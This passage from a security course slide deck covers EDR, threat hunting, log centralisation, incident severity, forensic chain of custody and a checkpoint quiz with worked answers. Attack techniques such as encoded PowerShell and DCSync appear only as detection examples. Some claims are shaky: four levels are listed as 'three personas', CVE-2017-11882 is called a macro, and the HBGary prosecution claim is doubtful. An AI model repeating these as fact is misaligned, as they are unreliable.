- **Process Termination:** Kill a malicious process on a remote endpoint from the SOC console.
- **Network Isolation:** Block all network traffic from a compromised host except the EDR management channel.
- **File Quarantine:** Automatically or manually quarantine suspicious files.
- **Live Response:** Interactive shell session into a remote endpoint for real-time investigation.
:::
::::
::::

:::notes
Endpoint Detection and Response, a term coined by Gartner analyst Anton Chuvakin in 2013, represents the evolution beyond traditional antivirus. While antivirus operates by matching files against signature databases, EDR continuously records endpoint activity and applies behavioral analysis to detect attacks that use legitimate tools or novel malware variants.

The defining architectural capability of EDR is continuous telemetry recording with retroactive query capability. When a SOC analyst investigates a suspicious alert, they can query the EDR's historical telemetry to see exactly what happened before, during, and after the suspicious event, even if it occurred two weeks ago. This is called "retrospective detection" and it allows security teams to scope incidents and identify patient-zero hosts without relying on incomplete log coverage. CrowdStrike Falcon Insight retains endpoint telemetry for ninety days by default; Microsoft Defender for Endpoint retains data for thirty days.

The major EDR platforms differ in their integration approach. Microsoft Defender for Endpoint (MDE) is deeply integrated with the Microsoft 365 ecosystem, it ingests Azure AD identity events, Exchange email telemetry, and SharePoint access logs alongside endpoint events, providing a unified investigation view. CrowdStrike Falcon is known for its lightweight agent architecture (approximately 1.5% CPU overhead) and its Threat Graph, a graph database linking adversary relationships across the global CrowdStrike customer base. SentinelOne differentiates on autonomous response: its Storyline AI can automatically remediate detections without human analyst intervention, including rolling back ransomware file encryption using Volume Shadow Copy snapshots.

EDR platforms have become essential for detecting the techniques covered in this class. The credential dumping techniques discussed previously, lsass.exe access, DCSync, are detected natively by all major EDR platforms and result in automatic process termination in their highest protection modes. Process injection techniques (Sysmon Event ID 8) are similarly detected and blocked. This explains why sophisticated threat actors increasingly target EDR platforms themselves, several intrusion campaigns have included techniques to disable or tamper with EDR agents (MITRE ATT&CK T1562.001, Impair Defenses: Disable or Modify Tools).

An EDR investigation timeline shows a complete process tree with child processes, network connections and file operations in one view, which makes an incident's full chain legible in a way isolated log lines cannot.
:::

%%%
---
unit: Techniques
code: HUNT
title: Threat Hunting Methodology
---
:::callout style=soft
**Threat hunting** is the proactive, hypothesis-driven search for adversary activity that has evaded existing detection controls. It is the highest-maturity detection capability, sitting above automated alerting in the SOC maturity model.
:::

:::image src="images/19_threat_hunting_methodology.png" alt="Circular process diagram showing the four-phase threat hunting cycle: Hypothesis Formation using ATT&CK framework and threat intelligence, Data Collection from SIEM and EDR telemetry, Investigation using pivot and correlation analysis, and Outcome, either confirming compromise and escalating to incident response, or improving detection rules to close coverage gaps" caption="Threat hunting cycle: hypothesis-driven investigation converts intelligence about adversary behavior into active search operations across enterprise telemetry." width=full
:::

:::steps
1. **Formulate Hypothesis:** Based on a current threat intelligence report or ATT&CK technique gap, define what attacker behavior you expect to find if the technique is present.
2. **Define Data Sources:** Identify which log sources contain the telemetry needed to validate or refute the hypothesis.
3. **Query & Analyze:** Write SIEM queries or EDR searches to surface all instances of the suspected behavior across the enterprise.
4. **Investigate Anomalies:** Manually review results to separate legitimate activity from suspicious patterns requiring deeper analysis.
5. **Document Outcome:** If compromise found, escalate to incident response. If no compromise found, document the hunt as evidence of coverage and refine detection rules to automate future detection.
:::

:::notes
Threat hunting bridges the gap between automated detection (which only finds known-bad patterns) and complete ignorance of adversary presence. It is the practice of assuming that sophisticated adversaries may already be in the environment, having bypassed automated controls, and actively searching for their footprints.

The SANS threat hunting model defines three hunter personas based on experience level. Level 0 hunters rely entirely on automated tooling and vendor-provided detections. Level 1 hunters investigate SIEM alerts manually but do not proactively search. Level 2 hunters formulate hypotheses and conduct structured data analysis. Level 3 hunters develop custom detection models, reverse engineer adversary tools, and contribute back to the threat intelligence community.

Effective threat hunting begins with a hypothesis derived from threat intelligence. For example, if a threat intelligence report indicates that a specific APT group is targeting your industry sector and uses WMI event subscriptions for persistence, the hunt hypothesis is: "Are there unauthorized WMI event subscriptions active in our environment?" The data source for this hypothesis is the WMI repository, queryable via PowerShell (Get-WMIObject -Namespace root\subscription -Class __EventFilter). The hunt query enumerates all WMI subscriptions and compares them against a known-good baseline. Any subscription that does not match the baseline is an anomaly requiring investigation.

The Sqrrl (now AWS) Threat Hunting Reference Model introduced the concept of the "hunting loop" and identified three hypothesis types: intelligence-driven (based on threat reports), situational awareness (based on environmental changes), or domain expertise (based on deep knowledge of attacker techniques). All three paths lead to the same investigation process. The key differentiator of mature threat hunting programs is their feedback loop: every completed hunt either discovers an incident (value realized) or, more commonly, identifies a detection gap (also value realized, new SIEM rules are written to automate future detection of the hunted technique). This continuous improvement cycle is what drives SOC maturity from Level 1 to Level 3.

NIST SP 800-137A (Assessing Information Security Continuous Monitoring Programs) provides assessment criteria for evaluating the maturity of threat hunting programs within the broader continuous monitoring framework. Organizations seeking to demonstrate detection capability to auditors or certifiers (such as FedRAMP or PCI DSS assessors) can use this framework to evidence their hunting practices.

A threat hunt proceeds from a hypothesis to a data source to evidence: for a system suspected of running a Cobalt Strike beacon, the hypothesis is process injection, the data sources are Sysmon's image-load events and memory-analysis output such as malfind, and the evidence is injected memory regions in a host process. This reproduces the full detection chain end to end.
:::

%%%
---
unit: Misconceptions
code: FAQ
title: Common Misconceptions in Device Attack Detection
---
:::callout style=soft
Security professionals frequently operate under misconceptions about detection capabilities and attacker behavior. Correcting these misconceptions is essential for building effective, realistic detection programs.
:::

:::image src="images/19_detection_misconceptions.png" alt="Six-panel myth-vs-reality card layout, each card split horizontally with a red 'Myth' section at the top and a green 'Reality' correction below, covering topics: antivirus sufficiency, hash-based detection, log volume as quality indicator, rebooting to remove malware, encryption as evidence of innocence, and alert volume as detection effectiveness" caption="Detection misconceptions debunked: six common beliefs that undermine security program effectiveness, with evidence-based corrections for each." width=full
:::

::::columns ratio=1:1
::col::
:::list style=plain
- **Myth 1, "Antivirus will catch everything"**
  Reality: AV detects known signatures. CrowdStrike's 2023 report shows 71% of attacks use no malware at all, LoTL techniques bypass AV entirely.

- **Myth 2, "Blocking IPs and hashes is enough"**
  Reality: The Pyramid of Pain shows attackers change IPs and hashes trivially. TTP-level detection is required for durable defense.

- **Myth 3, "More alerts = better security"**
  Reality: Excessive alerts cause alert fatigue. A well-tuned SIEM with 95% true-positive rate delivers more value than a noisy one generating ten thousand daily alerts.
:::
::col::
:::list style=plain
- **Myth 4, "Rebooting an infected system removes malware"**
  Reality: Many persistence mechanisms survive reboots (registry Run keys, services, scheduled tasks). Rebooting also destroys volatile evidence in RAM, hindering forensics.

- **Myth 5, "Encrypted traffic is safe from analysis"**
  Reality: JA3 TLS fingerprinting and certificate analysis can identify malware C2 frameworks even in encrypted HTTPS sessions, without decrypting the payload.

- **Myth 6, "Logs are only useful after a breach"**
  Reality: Continuous behavioral analysis of logs enables detection during an active breach, often before exfiltration occurs, and is the foundation of threat hunting.
:::
::::

:::notes
Correcting widely held misconceptions is one of the most valuable educational activities in a security course, because incorrect mental models lead to poor decisions with real organizational consequences. Let us work through each misconception in detail.

Misconception 1, Antivirus Sufficiency: Traditional antivirus operates by comparing file hashes and byte sequences against a database of known malware signatures. This approach is effective against known, unmodified malware samples but fails completely against several common attacker techniques. Fileless malware (T1059 scripting interpreters) never writes to disk. Polymorphic malware automatically alters its byte structure to produce new hashes on each infection. Living-Off-the-Land techniques use signed system binaries that AV whitelists by definition. The 2023 Verizon Data Breach Investigations Report (DBIR) confirmed that AV detection was not the primary detection method in a majority of investigated breaches.

Misconception 4, Rebooting to remove malware: This is particularly dangerous in a forensic context. Incident responders frequently encounter situations where well-meaning IT staff have rebooted compromised systems, destroying volatile memory evidence. The RFC 3227 Order of Volatility exists specifically because this instinct is natural but harmful. Beyond evidence destruction, rebooting does not remove malware that has established any form of persistence, registry Run keys, scheduled tasks, installed services, or WMI event subscriptions all survive reboots by design.

Misconception 5, Encrypted traffic analysis: JA3 fingerprinting, developed by John Althouse of Salesforce, creates a hash of TLS Client Hello parameters (SSL version, cipher suites, extensions, elliptic curves). These parameters vary between TLS implementations, and the JA3 hash for Cobalt Strike Beacon's default TLS implementation differs from the JA3 hash produced by a legitimate web browser, even when the payload is encrypted. Security vendors including Suricata, Zeek (Bro), and commercial NDR platforms include JA3 matching as a detection capability. This fundamentally undermines the attacker assumption that TLS encryption provides detection immunity.

Security misconceptions tend to reflect the maturity of the organizations where they were learned, which is why they form and persist differently across industry cultures.
:::

%%%
---
unit: Architecture
code: LOG
title: Log Forwarding & Centralization Architecture
---
:::callout style=soft
Collecting logs on individual endpoints is insufficient, logs must be **forwarded** to a centralized, tamper-resistant storage system to support correlation, long-term retention, and forensic investigation.
:::

:::image src="images/19_log_forwarding_architecture.png" alt="Enterprise log forwarding architecture diagram showing three collection tiers: endpoint agents (Sysmon, WEF) at the base, log aggregators and forwarders (Splunk Universal Forwarder, Elastic Beats, Fluentd) in the middle tier, and centralized SIEM storage with a separate immutable log archive at the top tier, with retention periods labeled at each tier" caption="Three-tier log architecture: endpoint generation, aggregator normalization, and centralized immutable storage with differentiated retention policies." width=full
:::

::::columns ratio=1:1
::col::
::::card heading="Log Forwarding Technologies"
:::list style=plain
- **Windows Event Forwarding (WEF):** Native Windows feature; subscribes to event channels on remote hosts and forwards over HTTPS using WS-Management protocol.
- **Syslog (RFC 5424):** Standard protocol for Linux/Unix and network device log forwarding; supports UDP, TCP, and TLS transport.
- **Splunk Universal Forwarder:** Lightweight agent that forwards raw log data to Splunk indexers; supports compression and TLS.
- **Elastic Beats:** Lightweight data shippers for the Elastic Stack; Winlogbeat specifically targets Windows Event Logs.
:::
::::
::col::
::::card heading="Retention Architecture"
:::list style=plain
- **Hot Tier (0-30 days):** Fast SSD storage for active investigation and real-time SIEM queries.
- **Warm Tier (30-90 days):** Lower-cost storage for recent forensic investigations; slightly higher query latency.
- **Cold Tier (90 days-7 years):** Immutable archive storage (WORM) for compliance and legal holds.
- **Log Integrity:** HMAC signing of log batches to detect tampering; blockchain-based log notarization for high-assurance environments.
:::
::::
::::

:::notes
Log generation without log centralization provides no meaningful security value. An attacker who compromises a host can clear local logs (Security Event ID 1102) to remove evidence of their activity. If those logs were only stored locally, the forensic record is destroyed. Centralized, tamper-resistant log storage ensures that log records survive a host compromise and remain available for investigation.

Windows Event Forwarding (WEF) is the native Microsoft solution for centralizing Windows Event Logs across an enterprise. The WEF architecture uses WS-Management (the same protocol as PowerShell remoting) to pull events from source computers to a central Windows Event Collector (WEC) server. Administrators define "subscriptions" that specify which event channels and event IDs to forward. A well-configured WEF deployment can forward high-priority events (Security log, Sysmon) with sub-second latency while forwarding lower-priority events in batches to reduce network overhead. WEF uses Kerberos authentication by default, ensuring that only authorized computers can deliver events.

Log retention requirements are driven by compliance frameworks and practical forensic needs. The Payment Card Industry Data Security Standard (PCI DSS) Requirement 10.7 mandates twelve months of log retention with three months immediately available for analysis. HIPAA Security Rule section 164.312(b) requires audit log retention for six years. NIST SP 800-92 Table 4-1 provides retention guidance by log source type, recommending ninety days of online retention for security logs in federal environments. Forensically, the relevant question is: how far back might an investigation need to reach? Given that the median attacker dwell time is sixteen days (Mandiant M-Trends 2023), ninety days of immediately queryable log retention provides adequate investigation capability for most incidents. However, advanced persistent threat campaigns like SUNBURST demonstrate that dwell times can extend to many months, justifying longer archival retention for high-value systems.

Log integrity is a frequently overlooked architectural requirement. If an attacker can modify stored logs before investigators review them, the forensic record is compromised. Tamper evidence can be implemented by computing HMAC-SHA256 hashes of log batches at ingestion time and storing those hashes in a separate, isolated system. Any modification to the log data will produce a hash mismatch detectable during investigation. AWS CloudTrail and Azure Monitor implement similar log integrity verification natively for cloud audit logs.

Log retention is costly at scale: an organization generating a terabyte of raw logs a day accumulates 365 terabytes a year, a significant storage budget. Security architects must make deliberate, documented decisions about which log sources justify long-term retention and which can be discarded after thirty days.
:::

%%%
---
unit: Framework
code: SEV
title: Incident Severity Classification Framework
---
:::callout style=soft
Not all security events require the same response. A **severity classification framework** enables consistent, documented prioritization of security incidents, ensuring the highest-risk events receive immediate escalation while lower-priority events are queued efficiently.
:::

:::image src="images/19_severity_classification.png" alt="Five-level severity pyramid diagram with color coding from red at the apex (Critical, Severity 1) through orange, yellow, blue to green at the base (Informational, Severity 5), with example incident types listed beside each level and target response times annotated on the right side" caption="Five-level incident severity classification: a consistent taxonomy enables the SOC to allocate analyst resources proportionally to incident risk and business impact." width=full
:::

:::table
| Severity | Classification | Example Incident | Target Response Time | Escalation |
|---|---|---|---|---|
| **SEV-1 (Critical)** | Active breach with confirmed data exfiltration or ransomware deployment | Confirmed ransomware on multiple systems; DCSync detected | 15 minutes | CISO + CSIRT + Legal |
| **SEV-2 (High)** | Confirmed compromise of one system; no confirmed lateral movement | LSASS access detected; Cobalt Strike beacon identified | 30 minutes | CSIRT Lead + Manager |
| **SEV-3 (Medium)** | Suspicious behavioral indicator; unconfirmed compromise | Multiple failed logons followed by success; registry modification | 4 hours | SOC Analyst Tier 2 |
| **SEV-4 (Low)** | Known-good behavior flagged by detection rule; likely false positive | Administrative script matched persistence detection rule | 24 hours | SOC Analyst Tier 1 |
| **SEV-5 (Info)** | Informational event; no immediate action required | Routine logon from known workstation during business hours | Next business day | Log for trend analysis |
:::

:::notes
A severity classification framework is a foundational operational tool for any security operations center. Without consistent severity definitions, analysts make independent subjective decisions about escalation, leading to inconsistent response times and potential failure to escalate critical incidents promptly.

The classification criteria should be documented in the SOC's Standard Operating Procedures (SOP) and reviewed regularly as the organization's threat landscape evolves. The criteria typically evaluate three dimensions: the confidence level of the indicator (high confidence behavioral match vs. low-confidence signature match), the scope of the potential compromise (multiple systems vs. a single workstation), and the potential business impact (systems holding regulated data vs. development workstations).

SEV-1 classification should trigger the organization's formal Incident Response Plan, a documented procedure specifying exactly who is contacted, in what sequence, and what immediate actions must be taken. For ransomware specifically, the immediate actions are: network isolation of affected hosts to prevent further encryption spread, notification of legal counsel (ransomware may involve extortion and has legal notification implications), and evidence preservation per RFC 3227 before any remediation actions destroy forensic data. The Cybersecurity and Infrastructure Security Agency (CISA) provides a ransomware response checklist (CISA.gov/stopransomware) that aligns with this framework.

NIST SP 800-61r2 (Computer Security Incident Handling Guide) provides the foundational framework for incident classification and response procedures. It defines four incident severity categories and maps them to specific response procedures. The NIST classification maps broadly to our five-level framework: NIST Functional Impact Category "High" (organization lost the ability to provide critical services to users) corresponds to our SEV-1 and SEV-2 combined.

An important operational consideration is the documented "escalation path", who receives the notification for each severity level and what information must be included. SOC analysts often hesitate to escalate borderline incidents for fear of being wrong. The classification framework removes this ambiguity: if the observable indicators match a defined category, escalation is mandatory regardless of the analyst's personal confidence level. This is sometimes called the "escalate in doubt" principle and is explicitly recommended by NIST SP 800-61r2 section 3.2.6.

Severity classification requires looking beyond the initial alert: an alert that appears to be a false positive can sit on top of genuinely malicious activity, so the context behind the alert, not just the alert text, determines the correct severity and escalation.
:::

%%%
---
unit: Framework
code: COC
title: Digital Forensics Chain of Custody
---
:::callout style=soft
**Chain of custody** is the documented, unbroken record of who possessed digital evidence, when, and under what conditions. A broken chain of custody can render forensic evidence inadmissible in legal proceedings and undermine prosecution efforts.
:::

:::image src="images/19_chain_of_custody.png" alt="Flowchart showing the chain of custody documentation lifecycle: initial seizure with evidence tag, handoff to forensic analyst with signature capture, analysis in the forensics lab, secure evidence storage, and final presentation to legal counsel, with a chain of custody form template shown beside the flowchart with fields for item number, description, date/time, and handler signatures" caption="Chain of custody lifecycle: every transfer of digital evidence must be documented with handler identity, timestamp, and purpose to maintain forensic integrity from seizure to courtroom." width=full
:::

:::steps
1. **Identify and Document:** Before touching any device, photograph it in place and document its physical state, location, and date/time of discovery.
2. **Assign Evidence Tag:** Apply a unique evidence identification number and affix a tamper-evident evidence seal to all physical media.
3. **Acquire Image:** Create a forensic image (bit-for-bit copy) using a write-blocker to prevent any modification to the original evidence.
4. **Verify Hash:** Compute MD5 and SHA-256 hashes of both the original media and the forensic image; verify they match exactly.
5. **Document Each Transfer:** Record every transfer of the evidence with the handler's name, badge number, date, time, and purpose.
6. **Secure Storage:** Store original evidence in a locked, access-controlled evidence locker; maintain logs of all access.
:::

:::notes
Chain of custody is not merely a bureaucratic formality, it is the legal foundation that makes forensic evidence admissible in criminal prosecution, civil litigation, or regulatory proceedings. In the absence of a documented chain of custody, defense counsel can argue that evidence may have been altered, contaminated, or fabricated between the time of seizure and the time of presentation. Courts have excluded digital evidence on these grounds, resulting in failed prosecutions.

The forensic image is the cornerstone of digital evidence preservation. A write-blocker, a hardware or software device that intercepts write commands to a storage medium, is used during imaging to ensure that the acquisition process does not alter any data on the original evidence. Tools such as Forensic Toolkit Imager (FTK Imager), Guymager, and dcfldd create complete, verifiable copies of storage media. The hash verification step is critical: computing SHA-256 hashes of both the original media and the forensic image and confirming they are identical proves that the image is a perfect copy of the original. Any hash discrepancy indicates that the image was not accurately captured and requires re-acquisition.

ISO/IEC 27037:2012 (Guidelines for Identification, Collection, Acquisition, and Preservation of Digital Evidence) provides the internationally recognized standard for digital evidence handling. It defines the roles of the Digital Evidence First Responder (DEFR), who secures and documents the scene, and the Digital Evidence Specialist (DES), who performs detailed technical acquisition and analysis. The separation of these roles prevents conflicts of interest and ensures that no single person has unchecked control over evidence handling.

Practical chain of custody failures include: failing to photograph evidence before moving it, using inadequate evidence packaging that allows physical damage during transport, failing to document timestamps accurately (use UTC time consistently to avoid timezone confusion in court), and allowing personnel without documented authorization to access evidence storage. The 2012 HBGary Federal security incident resulted in a failed prosecution in part due to evidence handling procedural deficiencies that allowed defense counsel to challenge forensic conclusions.

For network forensic evidence (PCAP files, SIEM log exports), the same principles apply. Log exports must be hash-verified at export time, and the export process must be documented with the analyst's name, timestamp, and the specific query parameters used to generate the export. SIEM vendors including Splunk and Microsoft Sentinel support cryptographic signing of search result exports for exactly this purpose.

Chain-of-custody documentation must begin before any analysis; it cannot be added retrospectively to steps already taken. Forensic readiness is the organizational state of having evidence-handling procedures in place before an incident, rather than improvising under pressure during one.
:::

%%%
---
unit: Checkpoint
code: CHK
title: Mid-Unit Checkpoint, Detection Concepts Review
---
:::callout style=soft
Take five minutes to answer these concept check questions individually before comparing answers with your neighbor. These questions reflect common exam and interview topics in endpoint detection and digital forensics.
:::

:::image src="images/19_checkpoint_review.png" alt="Illustrated quiz card with a stopwatch icon indicating a timed exercise, showing five numbered question boxes arranged in a grid format with space for written answers, and a QR code linking to an interactive quiz version" caption="Mid-unit knowledge check: individual reflection followed by partner discussion reinforces key concepts before the class continues to advanced topics." width=full
:::

:::list style=plain
- **Q1:** An analyst observes `winword.exe` spawning `cmd.exe`, which then executes `powershell.exe -enc [base64string]`. Which MITRE ATT&CK technique does this represent, and which Sysmon event ID captures it?

- **Q2:** A threat intelligence report states that APT29 uses a specific C2 IP address. According to the Pyramid of Pain, how durable is this indicator, and what higher-value indicator would you prioritize instead?

- **Q3:** A first responder at an incident scene wants to "just reboot" a compromised workstation to stop malware execution. What RFC-referenced principle are they violating, and what data would be lost?

- **Q4:** What is the difference between a SIEM correlation rule and threat hunting? When is each approach more appropriate?

- **Q5:** A SOC analyst observes Security Event ID 4662 with DS-Replication-Get-Changes-All from a user workstation account. What attack is likely occurring, and what MITRE ATT&CK technique ID applies?
:::

:::notes
This checkpoint slide is designed as a structured active learning intervention, a brief pause in content delivery for students to consolidate their understanding before continuing. Research in cognitive science consistently demonstrates that retrieval practice (testing yourself on material) produces significantly better long-term retention than passive re-reading. The five-minute individual reflection followed by partner comparison mirrors the think-pair-share pedagogy.

Let us work through the correct answers so the instructor can guide post-exercise discussion. Question 1: The attack chain describes a malicious macro in a Word document exploiting CVE-2017-11882 or a similar vulnerability to spawn a command interpreter (MITRE ATT&CK T1203 Exploitation for Client Execution), which then uses PowerShell with base64-encoded commands for obfuscation (T1059.001 PowerShell, T1027.010 Obfuscated Files or Information: Command Obfuscation). Sysmon Event ID 1 (Process Create) captures each step of this chain, providing the parent-child relationship that makes the attack visible. The base64 encoding is detectable via PowerShell Script Block Logging (Event ID 4104), which decodes the content before logging.

Question 2: An IP address sits at the second level from the bottom of the Pyramid of Pain, rated "Easy" to change. An attacker receiving an IP block will simply move their C2 infrastructure to a new IP within hours. The higher-value indicator to prioritize would be the TTP-level behavior associated with APT29, for example, their use of SUNBURST's domain-generation algorithm pattern (a behavioral signature), their preference for WMI persistence, or their specific Cobalt Strike configuration parameters (malleable C2 profiles).

Question 3: Rebooting violates RFC 3227's Order of Volatility, specifically the principle that RAM (Random Access Memory) must be captured before it is destroyed. Lost data includes: running processes and their command-line arguments, active network connections and established C2 channels, decrypted cryptographic keys that may be resident in memory, the memory-resident payload if fileless malware is present, and potentially decrypted credentials stored by running browser processes.

Question 4: SIEM correlation rules automate pattern detection for known-bad behaviors defined in advance, they fire when observed events match a predefined condition. Threat hunting is proactive, hypothesis-driven manual investigation that searches for attacker behavior that has not yet been automated into rules. SIEM correlation rules are appropriate for high-volume, well-understood attack patterns (brute force, known persistence techniques). Threat hunting is appropriate when intelligence indicates a specific threat actor may be present, or when investigating coverage gaps where no rules exist.

Question 5: Security Event ID 4662 with DS-Replication-Get-Changes-All from a non-domain-controller source indicates a DCSync attack (MITRE ATT&CK T1003.006). The attacker is using Mimikatz's lsadump::dcsync module or a similar tool to request password hash replication from the domain controller, impersonating a legitimate domain replication partner. This allows extraction of all domain account hashes without direct code execution on the domain controller itself.

:::

%%%
---
unit: Comparison
code: COMP
title: Prevention vs. Detection vs. Response, A Comparison
---
:::callout style=soft
Effective security programs require balanced investment across **Prevention**, **Detection**, and **Response** capabilities. Over-investment in any single function at the expense of others creates exploitable gaps.
:::

:::image src="images/19_prevention_detection_response_comparison.png" alt="Three-column comparison infographic with Prevention on the left in blue, Detection in the center in amber, and Response on the right in green, each column listing the primary technologies, NIST CSF function alignment, when it is most effective, and its primary failure mode, with a balanced scale icon at the bottom indicating the need for equilibrium" caption="Prevention, Detection, and Response compared: each function addresses different phases of an attack lifecycle and has distinct failure modes that the others compensate for." width=full
:::

:::table
| Dimension | Prevention | Detection | Response |
|---|---|---|---|
| **Goal** | Stop the attack before it succeeds | Identify an attack in progress or completed | Contain damage and restore normal operations |
| **Primary Technologies** | Firewall, AV, patching, MFA, access control | SIEM, EDR, Sysmon, network monitoring | SOAR, IR playbooks, forensics tools |
| **NIST CSF Function** | Protect (PR) | Detect (DE) | Respond (RS) + Recover (RC) |
| **When Most Effective** | Against known attack patterns with available controls | When prevention controls are bypassed | After attacker achieves objectives |
| **Primary Failure Mode** | Zero-days, LoTL, credential abuse bypass controls | Alert fatigue causes missed detections | Poor playbooks lead to slow, incomplete containment |
| **Key Metric** | Vulnerability patch time; MFA adoption rate | Mean Time to Detect (MTTD); true positive rate | Mean Time to Respond (MTTR); containment scope |
:::

:::notes
One of the most important strategic concepts in cybersecurity program design is the balance between Prevention, Detection, and Response. Many organizations, particularly those in early security maturity stages, invest almost entirely in prevention controls: firewalls, antivirus, and access management. While these are necessary, they are not sufficient. The Assume Breach model, discussed at the beginning of this class, directly addresses the consequences of over-reliance on prevention.

The NIST Cybersecurity Framework organizes security capabilities into five core functions: Identify, Protect, Detect, Respond, and Recover. Prevention maps to the Protect function. Detection maps to the Detect function. Response maps to both Respond and Recover. A mature security program invests proportionally across all five functions and measures effectiveness using function-specific key performance indicators. For the Detect function, the primary KPI is Mean Time to Detect (MTTD), the average duration between the start of a compromise and its discovery. For the Respond function, the primary KPI is Mean Time to Respond (MTTR), the average duration between alert generation and incident containment. Mandiant's M-Trends report publishes industry average MTTD annually; the 2023 figure was sixteen days globally, though organizations with mature detection programs achieved median MTTD under four days.

The practical implication is that organizations should treat MTTD reduction as a measurable business objective, not merely a technical aspiration. Each Sysmon deployment, each new SIEM correlation rule, and each threat hunting exercise directly contributes to reducing MTTD. A reduction from thirty-day median MTTD to seven days means an attacker has three fewer weeks to perform reconnaissance, establish persistence, escalate privileges, and exfiltrate data. This translates directly to reduced breach impact cost.

The response function is often the least invested in until after a major incident. Organizations frequently have incident response plans on paper but have never actually tested them through tabletop exercises or simulated incidents. NIST SP 800-61r2 recommends that organizations conduct incident response exercises at least annually, exercising both technical response procedures and organizational communication channels. Without practiced response playbooks, the pressure of a real incident leads to poor decisions, including the destructive actions like rebooting systems or deleting logs that destroy forensic evidence.

Gartner data suggests most organizations spend roughly 50-60% of the security budget on prevention, 30-35% on detection and 10-15% on response. Given that a large share of attacks now bypass prevention controls, that allocation is worth questioning, as it underweights the detection and response capabilities that catch what prevention misses.
:::

%%%
---
unit: Summary
code: SUM
title: Class 19 Review & Detection Engineering
---
:::pullquote
"Security teams cannot contain what they have not detected. Robust host defense requires continuous telemetry collection, behavioral analysis, and forensic preservation."
:::

:::image src="images/19_detection_engineering_summary.png" alt="Circular summary diagram showing five interconnected detection engineering pillars: Assume Breach mindset, Sysmon telemetry collection, Pyramid of Pain behavioral analysis, RFC 3227 forensic preservation, and registry and process auditing" caption="Detection engineering in practice: five mutually reinforcing capabilities that together enable an organization to identify, investigate, and respond to host-level compromises." width=full
:::

:::list style=chips
- Assume Breach Mindset (Zero Trust)
- Windows Security Logs & Sysmon Telemetry
- David Bianco's Pyramid of Pain (TTPs)
- RFC 3227 Order of Volatility
- Registry and Process Auditing
:::

:::notes
To wrap up Class 19, remember that detecting device attacks requires a transition from simple signature matching to behavioral analysis. While hardening configurations and access control policies reduce risk, they are not a guarantee of security.

Implementing telemetry systems, monitoring process creation, analyzing registry changes, and following forensics standards allows organizations to identify and investigate active compromises. This visibility is essential for understanding how an attacker gained access and what systems are affected.

In our next session, Class 20, we will explore incident response. We will learn how to use the evidence gathered during detection to contain threats, eradicate malware, and restore systems to normal operations using structured frameworks.

The detection capabilities covered in Class 19 align with the Detect (DE) function of the NIST Cybersecurity Framework (NIST CSF), specifically the DE.CM (Security Continuous Monitoring) category. Organizations implementing these capabilities should measure their detection maturity against a defined model. A Level 1 SOC detects incidents reactively through signature-based alerts. A Level 2 SOC performs behavioral analysis using SIEM correlation rules. A Level 3 SOC conducts proactive threat hunting, using the MITRE ATT&CK framework to hypothesize and test for adversary behaviors before alerts fire. The ATT&CK Navigator tool, maintained by MITRE, allows security teams to visualize their detection coverage across the entire ATT&CK matrix, identifying gaps where adversary techniques go unmonitored. Endpoint Detection and Response (EDR) solutions, such as Microsoft Defender for Endpoint, CrowdStrike Falcon, and SentinelOne, automate much of the behavioral analysis discussed today by correlating endpoint telemetry with ATT&CK techniques in real time. As we move into Class 20 (Incident Response), the detection and forensic evidence discussed today becomes the input to the formal response process. The quality of telemetry collected, Sysmon logs, memory images, and registry audit data, directly determines the CSIRT's ability to scope, contain, and eradicate a threat. Detection without a structured response plan leaves teams with evidence but no actionable path forward.
:::
